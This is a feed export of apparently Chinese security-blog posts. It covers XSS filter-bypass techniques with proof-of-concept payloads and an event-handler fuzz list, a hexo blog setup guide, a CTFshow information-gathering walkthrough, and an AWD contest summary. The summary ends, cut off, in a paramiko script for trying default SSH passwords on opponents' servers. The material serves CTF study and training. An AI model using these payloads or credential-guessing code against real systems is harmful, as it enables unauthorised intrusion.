class=\"language-javascript\"><span class=\"token operator\">&lt;</span>not_real_tag onclick<span class=\"token operator\">=</span><span class=\"token string\">\"alert(/xss/)\"</span> <span class=\"token operator\">></span>click me<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>not_real_tag<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>像这样构造也能正常执行xss脚本，也就是说如果输出点在HTML标签中或者js脚本中，那么我们可以通过简单的闭合拼接属性那么就可以成功执行xss</p>\n<h3 id=\"事件过滤\"><a href=\"#事件过滤\" class=\"headerlink\" title=\"事件过滤\"></a>事件过滤</h3><p>很多时候开发者者会选择过滤事件来防止xss，但是不排除有漏网之鱼，这里可以fuzz尝试</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Fuzz字典分享:\nonafterprint\noninput\nonscrol1\nonbeforeprint\noninvalid\nonabort\nonbeforeunload\nonreset\noncanplay\nonerror\nonselect\noncanplaythrough\nonhaschange\nonsubmit\nondurationchange\nonload\nonkeydown\nonemptied\nonmessage\nonkeypress\nonended\nonoffline\nonkeyup\nonerror\nononline\nonclick\nonloadeddata\nonpagehide\nondblclick\nonloadedmetadata\nonpageshow\nondrag\nonloadstart\nonpopstate\nondragend\nonpause\nonredo\nondragenter\nonplay\nonresize\nondragleave\nonplaying\nonstorage\nondragover\nonprogress\nonundo\nondragstart\nonratechange\nonunload\nondrop\nonreadystatechange\nonblur\nonmous edown\nonseeked\nonchange\nonmous emove\nonseeking\noncontextmenu\nonmouseout\nonstalled\nonfocus\nonmouseover\nonsuspend\nonformchange\nonmouseup\nontimeupdate\nonforminput\nonmousewheel\nonvolumechange<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同样还有一些不属于事件属性，但可以用于执行js代码，比如常见的js伪协议</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>a herf<span class=\"token operator\">=</span><span class=\"token string\">\"javascript:alert(/xss/)\"</span><span class=\"token operator\">></span>click me <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"敏感字符的过滤\"><a href=\"#敏感字符的过滤\" class=\"headerlink\" title=\"敏感字符的过滤\"></a>敏感字符的过滤</h3><p>在html中，&lt;&gt;”和’&amp;都有特殊的意义，HTML的标签属性就是由这几个字符组成的，如果直接输出可能会导致整个HTML文档的结构，所以我们通常情况将这些字符转义，比如php提供了htmlspeciachars和htmlentities两个函数把一些预定字符转义转换成HTML实体</p>\n<ul>\n<li>(&amp;)成为&amp;amp</li>\n<li>(“)成为&amp;quot</li>\n<li>(‘)成为&amp;#039</li>\n<li>(&lt;)成为&amp;lt</li>\n<li>(&gt;)成为&amp;gt</li>\n</ul>\n<p>关键字过滤其实大部分是针对敏感变量或者函数进行的，如eval，cookie等，这部分的过滤可以通过字符串拼接，编码解码等方法绕过</p>\n<h4 id=\"字符串拼接混淆\"><a href=\"#字符串拼接混淆\" class=\"headerlink\" title=\"字符串拼接混淆\"></a>字符串拼接混淆</h4><p>js中的对象方法可以通过数组的方式进行调用，比如调用alert函数</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token string\">'alert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里数组的下标是先要调用函数名字的字符串，既然说是字符串那么就可以通过字符串拼接的方式</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token string\">'al'</span><span class=\"token operator\">+</span><span class=\"token string\">'ert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>或者通过js自带的base编码来实现字符串的绕过</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token function\">atob</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"YWxl\"</span><span class=\"token operator\">+</span><span class=\"token string\">\"cnQ=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"编码解码\"><a href=\"#编码解码\" class=\"headerlink\" title=\"编码解码\"></a>编码解码</h4><p>基于字符串的代码混淆不仅可以通过字符串拼接的方式，还可以通过各种编码的方式，常用的有：</p>\n<ul>\n<li>HTML进制编码</li>\n<li>css进制编码</li>\n<li>js进制编码</li>\n<li>url编码</li>\n<li>jsfuck编码（一种只有<a href=\"\"></a>!+6个字符来编写js程序）</li>\n</ul>\n<h4 id=\"location-window-name\"><a href=\"#location-window-name\" class=\"headerlink\" title=\"location*,window.name\"></a>location*,window.name</h4><p>既然开发者会对输入的敏感字符进行过滤，可以将xss脚本放到不会交付到服务端的部分</p>\n<h4 id=\"过滤”-”\"><a href=\"#过滤”-”\" class=\"headerlink\" title=\"过滤”.”\"></a>过滤”.”</h4><p>事件拼接都由点组成，可以过滤点来防御</p>\n<p>但是在js中可以用with关键字设置变量的作用域。利用这个特性可以绕过点的过滤</p>\n<p>with(document)with(cookie)</p>\n<h4 id=\"过滤”-”-1\"><a href=\"#过滤”-”-1\" class=\"headerlink\" title=\"过滤”()”\"></a>过滤”()”</h4><p>js脚本中调用对象方法要使用(),使用throw关键字传递阐述可以绕过限制</p>\n<p>window.onerror&#x3D;alert; throw 1;</p>\n<h4 id=\"过滤空格\"><a href=\"#过滤空格\" class=\"headerlink\" title=\"过滤空格\"></a>过滤空格</h4><p>在标签属性间可以通过换行符0x09、0x10、0x12、0x13、0x0a等字符代替空格绕过过滤</p>\n<p>&lt;img%0asrc&#x3D;x%0aonerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</p>\n<p>在标签名称和第一个属性间也可以使用”&#x2F;“代替空格</p>\n<p>&lt;input&#x2F;onfocus&#x3D;alert(&#x2F;xss&#x2F;)&gt;</p>\n<h3 id=\"HTTPonly绕过\"><a href=\"#HTTPonly绕过\" class=\"headerlink\" title=\"HTTPonly绕过\"></a>HTTPonly绕过</h3><p>HTTPonly是cookie的一个安全属性，设置后可以防止xss漏洞产生的时候避免js脚本获取到cookie</p>\n<h4 id=\"cve-2012-0053\"><a href=\"#cve-2012-0053\" class=\"headerlink\" title=\"cve-2012-0053\"></a>cve-2012-0053</h4><p>Apache服务器在2.2.0-2.2.21版本中存在一个漏洞，我们可以通过向网站植入一个超大的cookie，令其HTTP头超过Apache的最大请求长度（4192字节），使得apache返回400错误，状态也中包含了HTTPonly保护的Cookie</p>\n<h4 id=\"phpinfo页面\"><a href=\"#phpinfo页面\" class=\"headerlink\" title=\"phpinfo页面\"></a>phpinfo页面</h4><p>无论设置是否设置了HTTPonly在phpinfo中都能看到Cookie</p>\n",
            "tags": [
                "Web",
                "XSS"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/",
            "url": "https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/",
            "title": "hexo+github搭建个人博客",
            "date_published": "2022-10-24T16:00:00.000Z",
            "content_html": "<p>应邀搭建一个小博客，hexo+github搭建方便（重点是可以白嫖）</p>\n<h3 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h3><p>安装node.js—-<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==\">Node.js官网</span></p>\n<p>安装完成后，使用命令node -v，出现下面的信息则证明安装成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204221944.png\" alt=\"image-20221007204221944\"></p>\n<p>安装git</p>\n<p>安装成功后执行命令git –version</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204532427.png\" alt=\"image-20221007204532427\"></p>\n<p>GitHub上面建立新的储存库</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007211507554.png\" alt=\"image-20221007211507554\"></p>\n<p>这里有个地方需要注意，一是名字一定要是用户名.github.io(不然会有很多问题)</p>\n<p>进入建好的项目的设置按钮中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007212119905.png\" alt=\"image-20221007212119905\"></p>\n<p>打开这个链接就已经有部署到网络上面的网页</p>\n<h3 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h3><p>创建一个文件夹存放部署在本地的文件，我这里选择放在F盘</p>\n<p>在dos命令框中输入</p>\n<ul>\n<li><p>npm install hexo -g，开始安装Hexo</p>\n</li>\n<li><p>漫长等待安装完成后，输入hexo检查是否安装成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214045244.png\" alt=\"image-20221007214045244\"></p>\n</li>\n<li><p>输入hexo init初始化文件夹（这个更慢，很烦下完两局象棋才结束）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214356434.png\" alt=\"image-20221007214356434\"></p>\n</li>\n<li><p>输入npm install，安装组件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214417379.png\" alt=\"image-20221007214417379\"></p>\n</li>\n<li><p>输入hexo s开启服务器，访问该网址</p>\n</li>\n</ul>\n<h3 id=\"Git绑定GIthub账号\"><a href=\"#Git绑定GIthub账号\" class=\"headerlink\" title=\"Git绑定GIthub账号\"></a>Git绑定GIthub账号</h3><p>在blog文件夹里，右键选择Git Base Here</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$ git config --global user.name “账号”\n$ git config --global user.email “邮箱”<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>输入ssh-keygen -t rsa -C “你的邮箱”，无脑连续三个回车</p>\n<p>登录Github，点击头像下的settings，点击侧边栏SSH and GPG keys，再点击Add SSH Key，在title处填入任意的标识，在Key部分里面添加刚才复制的id_rsa.pub文件里的内容，点击添加即可</p>\n<p>输入ssh -T <span class=\"exturl\" data-url=\"bWFpbHRvOiYjeDY3OyYjeDY5OyYjeDc0OyYjeDQwOyYjMTAzOyYjMTA1OyYjMTE2OyYjMTA0OyYjeDc1OyYjOTg7JiN4MmU7JiN4NjM7JiN4NmY7JiN4NmQ7\">&#x67;&#x69;&#x74;&#x40;&#103;&#105;&#116;&#104;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;</span>,出现你的用户名则成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007221435449.png\" alt=\"image-20221007221435449\"></p>\n<h3 id=\"配置Deployment\"><a href=\"#配置Deployment\" class=\"headerlink\" title=\"配置Deployment\"></a>配置Deployment</h3><p>在blog目录下，找到_config.yml文件，修改repo值（在末尾）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">deploy:\n\ttype: git \n\trepository: git@github.com:WShaobin&#x2F;WShaobin.github.io.git\n\tbranch: master<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>repository值是你在github项目里的ssh（右下角）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223433959.png\" alt=\"image-20221007223433959\"></p>\n<h3 id=\"部署到GitHub\"><a href=\"#部署到GitHub\" class=\"headerlink\" title=\"部署到GitHub\"></a>部署到GitHub</h3><p>右键git bash here执行命令：<code>hexo new post “文章”</code>或<code>hexo new “文章”</code></p>\n<p>这时候在文件夹_posts目录下将会看到已经创建的文件</p>\n<p>在生成以及部署文章之前，需要安装一个扩展：<code>npm install hexo-deployer-git --save</code></p>\n<p>使用编辑器编好文章，那么就可以使用命令：<code>hexo d -g</code>，生成以及部署了</p>\n<p>部署成功后访问你的地址：http:&#x2F;&#x2F;用户名.github.io。那么将看到生成的文章</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223612104.png\" alt=\"image-20221007223612104\"></p>\n",
            "tags": [
                "杂记",
                "hexo博客搭建"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "CTFshow-web入门信息收集",
            "date_published": "2022-10-24T16:00:00.000Z",
            "content_html": "<h2 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h2><p>CTRL+u解决</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111225748.png\" alt=\"image-20221025111225748\"></p>\n<h2 id=\"web2\"><a href=\"#web2\" class=\"headerlink\" title=\"web2\"></a>web2</h2><p>同web1</p>\n<h2 id=\"web3\"><a href=\"#web3\" class=\"headerlink\" title=\"web3\"></a>web3</h2><p>http头中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111448297.png\" alt=\"image-20221025111448297\"></p>\n<h2 id=\"web4\"><a href=\"#web4\" class=\"headerlink\" title=\"web4\"></a>web4</h2><p>查看robots.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111605443.png\" alt=\"image-20221025111605443\"></p>\n<p>访问&#x2F;flagishere.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111744010.png\" alt=\"image-20221025111744010\"></p>\n<h2 id=\"web5\"><a href=\"#web5\" class=\"headerlink\" title=\"web5\"></a>web5</h2><p>访问phps下载源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112204400.png\" alt=\"image-20221025112204400\"></p>\n<h2 id=\"web6\"><a href=\"#web6\" class=\"headerlink\" title=\"web6\"></a>web6</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112528587.png\" alt=\"image-20221025112528587\"></p>\n<p>有<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56aXAs5LiL6L295ou/5YiwZmxhZy8=\">www.zip,下载拿到flag</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112615777.png\" alt=\"image-20221025112615777\"></p>\n<h2 id=\"web7\"><a href=\"#web7\" class=\"headerlink\" title=\"web7\"></a>web7</h2><p>git的源码泄露，直接访问.git&#x2F;index.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113123637.png\" alt=\"image-20221025113123637\"></p>\n<h2 id=\"web8\"><a href=\"#web8\" class=\"headerlink\" title=\"web8\"></a>web8</h2><p>svn源码泄露同上</p>\n<h2 id=\"web9\"><a href=\"#web9\" class=\"headerlink\" title=\"web9\"></a>web9</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113301899.png\" alt=\"image-20221025113301899\"></p>\n<p>修改文件时意外退出，生成缓存文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113436950.png\" alt=\"image-20221025113436950\"></p>\n<h2 id=\"web10\"><a href=\"#web10\" class=\"headerlink\" title=\"web10\"></a>web10</h2><p>查看http头部的cookie头</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123327299.png\" alt=\"image-20221025123327299\"></p>\n<h2 id=\"web11\"><a href=\"#web11\" class=\"headerlink\" title=\"web11\"></a>web11</h2><p>域名dns解析，设置说明</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123858205.png\" alt=\"image-20221025123858205\"></p>\n<h2 id=\"web12\"><a href=\"#web12\" class=\"headerlink\" title=\"web12\"></a>web12</h2><p>robots.txt中写了后台登录连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124214192.png\" alt=\"image-20221025124214192\"></p>\n<p>用户名admin</p>\n<p>密码，页面上的手机号<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124407329.png\" alt=\"image-20221025124407329\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124438975.png\" alt=\"image-20221025124438975\"></p>\n<h2 id=\"web13\"><a href=\"#web13\" class=\"headerlink\" title=\"web13\"></a>web13</h2><p>页面下方发现这个pd能下载</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124750410.png\" alt=\"image-20221025124750410\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124715623.png\" alt=\"image-20221025124715623\"></p>\n<p>pdf中有密码，去尝试登录，拿到flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124945280.png\" alt=\"image-20221025124945280\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125023387.png\" alt=\"image-20221025125023387\"></p>\n<h2 id=\"web14\"><a href=\"#web14\" class=\"headerlink\" title=\"web14\"></a>web14</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125246077.png\" alt=\"image-20221025125246077\"></p>\n<p>去访问，有一个文本编辑器页面，寻找flag文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125742752.png\" alt=\"image-20221025125742752\"></p>\n<p>访问文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125808264.png\" alt=\"image-20221025125808264\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125522527.png\" alt=\"image-20221025125522527\"></p>\n<h2 id=\"web15\"><a href=\"#web15\" class=\"headerlink\" title=\"web15\"></a>web15</h2><p>发现有admin页面，先去访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130005877.png\" alt=\"image-20221025130005877\"></p>\n<p>有登录页面，但是不知道密码，忘记密码需要知道地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130113047.png\" alt=\"image-20221025130113047\"></p>\n<p>主页找到了邮箱地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130224266.png\" alt=\"image-20221025130224266\"></p>\n<p>通过qq号查询地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130433834.png\" alt=\"image-20221025130433834\"></p>\n<p>这里应该是机器人资料改了，题目没更新，正确地址是西安</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130628154.png\" alt=\"image-20221025130628154\"></p>\n<p>登录拿到flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130719590.png\" alt=\"image-20221025130719590\"></p>\n<h2 id=\"web16\"><a href=\"#web16\" class=\"headerlink\" title=\"web16\"></a>web16</h2><p>访问tz.php,php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131257496.png\" alt=\"image-20221025131257496\"></p>\n<p>打开phpinfo拿到flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131333881.png\" alt=\"image-20221025131333881\"></p>\n<h2 id=\"web17\"><a href=\"#web17\" class=\"headerlink\" title=\"web17\"></a>web17</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131929374.png\" alt=\"image-20221025131929374\"></p>\n<p>访问，将下载的文件打开拿到flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025132102118.png\" alt=\"image-20221025132102118\"></p>\n<h2 id=\"web18\"><a href=\"#web18\" class=\"headerlink\" title=\"web18\"></a>web18</h2><p>前端的验证，查看js</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145134964.png\" alt=\"image-20221025145134964\"></p>\n<p>分数大于100分会有弹窗，url解码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145209107.png\" alt=\"image-20221025145209107\"></p>\n<p>访问110.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145237831.png\" alt=\"image-20221025145237831\"></p>\n<h2 id=\"web19\"><a href=\"#web19\" class=\"headerlink\" title=\"web19\"></a>web19</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145332644.png\" alt=\"image-20221025145332644\"></p>\n<p>看到用户名密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145912834.png\" alt=\"image-20221025145912834\"></p>\n<p>登陆，拿到flag</p>\n<h2 id=\"web20\"><a href=\"#web20\" class=\"headerlink\" title=\"web20\"></a>web20</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150253122.png\" alt=\"image-20221025150253122\"></p>\n<p>这个目录下有东西，mdb文件是早期asp+access构架的数据库文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150409063.png\" alt=\"image-20221025150409063\"></p>\n<p>访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150541323.png\" alt=\"image-20221025150541323\"></p>\n",
            "tags": [
                "CTFshow",
                "信息收集"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "url": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "title": "Awd-web小结",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"查看比赛信息、规则\"><a href=\"#查看比赛信息、规则\" class=\"headerlink\" title=\"查看比赛信息、规则\"></a>查看比赛信息、规则</h2><p>注意赛方的限制比如说提交flag的间隔时间，flag的获取方式，通防的限制，对后门的处理要求等要注意的点，避免check丢分</p>\n<h2 id=\"改密码\"><a href=\"#改密码\" class=\"headerlink\" title=\"改密码\"></a>改密码</h2><p>awd模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：</p>\n<ul>\n<li>ssh连接密码即本地密码</li>\n</ul>\n<pre class=\"line-numbers language-ABAP\" data-language=\"ABAP\"><code class=\"language-ABAP\">passwd &#123;用户名&#125;\n做修改即可<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ul>\n<li>MySQL登录密码</li>\n</ul>\n<pre class=\"line-numbers language-apl\" data-language=\"apl\"><code class=\"language-apl\"><span class=\"token number\">1</span><span class=\"token dyadic-operator operator\">.</span> 使用 SET PASSWORD 命令\n步骤 <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>：输入命令mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。\n\n步骤 <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>：使用 SET PASSWORD 修改密码命令格式为 set password for username <span class=\"token dyadic-operator operator\">@</span>localhost <span class=\"token function\">=</span> password<span class=\"token punctuation\">(</span>newpwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n，其中 username 为要修改密码的用户名，newpwd 为要修改的新密码。\n\n<span class=\"token number\">2</span><span class=\"token dyadic-operator operator\">.</span> 使用mysqladmin修改密码\n使用 mysqladmin 命令修改 MySQL 的 root 用户密码格式为 mysqladmin <span class=\"token function\">-</span>u用户名 <span class=\"token function\">-</span>p旧密码 password 新密码。\n\n注意：修改密码的命令中 <span class=\"token function\">-</span>uroot 和 <span class=\"token function\">-</span>proot 是整体，不要写成 <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p root，<span class=\"token function\">-</span>u 和 root 间可以加空格，但是会有警告出现，所以就不要加空格了。\n\n<span class=\"token number\">3</span><span class=\"token dyadic-operator operator\">.</span> UPDATE直接编辑user表\n步骤 <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>：输入命令mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。\n\n步骤 <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>：输入use mysql<span class=\"token punctuation\">;</span>命令连接权限数据库。\n\n步骤 <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>：输入命令update mysql<span class=\"token dyadic-operator operator\">.</span>user set authentication_string<span class=\"token function\">=</span>password<span class=\"token punctuation\">(</span><span class=\"token string\">'新密码'</span><span class=\"token punctuation\">)</span> where user<span class=\"token function\">=</span><span class=\"token string\">'用户名'</span> and Host <span class=\"token function\">=</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">;</span>设置新密码。\n\n步骤 <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>：输入 flush privileges<span class=\"token punctuation\">;</span> 命令刷新权限。\n\n步骤 <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>：输入quit<span class=\"token punctuation\">;</span>命令退出 MySQL 重新登录，此时密码已经修改为刚才输入的新密码了。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>后台的登录密码</li>\n</ul>\n<pre class=\"line-numbers language-ASN.1\" data-language=\"ASN.1\"><code class=\"language-ASN.1\">updata admin set user pass&#x3D;’123456’;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果密码是默认的尝试别人的能否登录</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n\nip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.137'</span>\nport <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\nusername <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\npasswd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n<span class=\"token comment\"># ssh 用户名 密码 登陆</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n   